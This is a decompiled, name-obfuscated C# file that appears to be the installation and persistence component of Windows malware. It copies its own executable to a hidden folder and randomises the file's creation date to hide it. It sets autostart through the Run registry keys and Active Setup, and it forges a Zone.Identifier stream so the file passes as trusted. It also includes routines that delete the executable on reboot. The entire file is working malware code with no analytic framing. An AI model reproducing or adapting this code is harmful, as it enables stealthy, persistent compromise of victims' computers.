using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

namespace ns0;

internal class Class9
{
	public enum Enum1
	{
		const_0,
		const_1,
		const_2
	}

	public static void smethod_0()
	{
		smethod_1();
		smethod_3();
		smethod_2();
	}

	private static void smethod_1()
	{
		try
		{
			if (!Directory.Exists(Class2.string_1))
			{
				Directory.CreateDirectory(Class2.string_1);
			}
		}
		catch
		{
		}
		try
		{
			File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Path.Combine(Class2.string_1, Class12.smethod_3(Class2.string_2, bool_0: true)), overwrite: true);
		}
		catch
		{
		}
		try
		{
			if (Class2.bool_11)
			{
				Random random = new Random();
				int day = random.Next(1, 28);
				int month = random.Next(1, 12);
				int year = random.Next(2000, DateTime.Now.Year);
				Directory.SetCreationTime(Path.Combine(Class2.string_1, Class12.smethod_3(Class2.string_2, bool_0: true)), new DateTime(year, month, day));
			}
		}
		catch
		{
		}
		if (Class2.bool_8)
		{
			try
			{
				File.SetAttributes(Class2.string_1, FileAttributes.Hidden | FileAttributes.NotContentIndexed);
			}
			catch
			{
			}
		}
		if (Class2.bool_9)
		{
			try
			{
				File.SetAttributes(Path.Combine(Class2.string_1, Class12.smethod_2(Class2.string_2, bool_0: true)), FileAttributes.Hidden | FileAttributes.NotContentIndexed);
			}
			catch
			{
			}
		}
	}

	public static void smethod_2()
	{
		try
		{
			if (Class2.bool_1)
			{
				Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue(Class12.smethod_3(Class2.string_3, bool_0: true), Class2.string_1 + "\\" + Class12.smethod_3(Class2.string_2, bool_0: true));
			}
		}
		catch
		{
		}
		try
		{
			if (Class2.bool_2)
			{
				Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue(Class12.smethod_3(Class2.string_3, bool_0: true), Class2.string_1 + "\\" + Class12.smethod_3(Class2.string_2, bool_0: true));
			}
		}
		catch
		{
		}
		try
		{
			if (Class2.bool_3)
			{
				RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\" + Class12.smethod_3(Class2.string_5, bool_0: true));
				registryKey.SetValue("StubPath", Class2.string_1 + "\\" + Class12.smethod_3(Class2.string_2, bool_0: true));
				registryKey.SetValue("IsInstalled", 1, RegistryValueKind.DWord);
			}
		}
		catch
		{
		}
	}

	private static void smethod_3()
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = "cmd.exe";
			processStartInfo.UseShellExecute = false;
			processStartInfo.RedirectStandardInput = true;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo = processStartInfo;
			process.Start();
			StreamWriter standardInput = process.StandardInput;
			standardInput.WriteLine("cd " + Class2.string_1);
			standardInput.WriteLine("echo [zoneTransfer]ZoneID = 2 > " + Class12.smethod_3(Class2.string_2, bool_0: true) + ":ZONE.identifier");
			standardInput.Close();
			process.Kill();
		}
		catch
		{
		}
	}

	public static void smethod_4()
	{
		try
		{
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").DeleteValue(Class12.smethod_3(Class2.string_3, bool_0: true));
		}
		catch
		{
		}
		try
		{
			Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").DeleteValue(Class12.smethod_3(Class2.string_4, bool_0: true));
		}
		catch
		{
		}
		try
		{
			Registry.LocalMachine.DeleteSubKey("SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\" + Class12.smethod_3(Class2.string_5, bool_0: true));
		}
		catch
		{
		}
		try
		{
			switch (Class2.registryHive_0)
			{
			case RegistryHive.CurrentUser:
				Registry.CurrentUser.DeleteSubKey(Class2.string_9);
				break;
			case RegistryHive.LocalMachine:
				Registry.LocalMachine.DeleteSubKey(Class2.string_9);
				break;
			}
		}
		catch
		{
		}
		smethod_5();
	}

	public static void smethod_5()
	{
		try
		{
			string tempFileName = Path.GetTempFileName();
			File.Delete(tempFileName);
			File.Move(Process.GetCurrentProcess().MainModule!.FileName, tempFileName);
			Class14.MoveFileEx(tempFileName, null, Class14.Enum3.flag_2);
		}
		catch (Exception)
		{
		}
	}
}
